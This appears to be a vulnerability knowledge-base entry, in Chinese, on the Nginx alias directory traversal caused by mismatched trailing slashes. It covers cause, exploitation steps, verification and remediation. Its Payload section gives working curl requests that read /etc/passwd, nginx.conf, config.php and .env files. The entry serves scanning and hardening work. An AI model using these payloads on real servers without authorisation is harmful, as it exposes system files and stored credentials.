---
id: NGINX-ALIAS-TRAVERSAL
title: Nginx Alias 目录穿越漏洞
product: nginx
vendor: Nginx
version_affected: "任意版本（配置相关）"
severity: HIGH
tags: [path_traversal, file_read, information_disclosure, 无需认证]
fingerprint: ["Nginx"]
---

## 漏洞描述

当 Nginx 使用 `alias` 指令映射目录且 `location` 路径末尾缺少 `/` 而 `alias` 路径末尾有 `/` 时，攻击者可以通过 `..` 穿越到 alias 目标目录的上级目录，读取服务器上的任意文件。

漏洞配置示例：
```nginx
location /files {
    alias /data/;
}
```

由于 `/files` 没有尾部斜杠但 `/data/` 有尾部斜杠，请求 `/files../etc/passwd` 会被解析为 `/data/../etc/passwd`，实现目录穿越。

## 影响版本

- 任意版本（取决于配置）

## 前置条件

- 无需认证
- 目标 Nginx 存在 `alias` 配置且 `location` 和 `alias` 斜杠不匹配

## 利用步骤

1. 识别使用 `alias` 映射的 `location` 路径（通过目录扫描或应用功能点发现）
2. 在路径末尾追加 `../` 尝试穿越到上级目录
3. 逐步穿越读取敏感文件

## Payload

```bash
# 基本目录穿越
curl "http://TARGET/files../etc/passwd"

# 读取 Nginx 配置文件
curl "http://TARGET/files../etc/nginx/nginx.conf"

# 读取应用源码
curl "http://TARGET/files../var/www/html/config.php"
curl "http://TARGET/files../var/www/html/.env"

# 列举上级目录
curl "http://TARGET/files../"
```

## 验证方法

```bash
# 检查是否能读取 /etc/passwd
curl -s "http://TARGET/files../etc/passwd" | grep "root:"

# 对比正常请求和穿越请求的响应
curl -sI "http://TARGET/files/"
curl -sI "http://TARGET/files../"
# 如果穿越请求返回 200 或目录列表，则漏洞存在
```

## 修复建议

1. 确保 `location` 和 `alias` 指令的尾部斜杠一致：
   ```nginx
   # 正确配置
   location /files/ {
       alias /data/;
   }
   ```
2. 使用 `root` 指令代替 `alias`（如果目录结构允许）
3. 定期审计 Nginx 配置文件中的 `alias` 用法
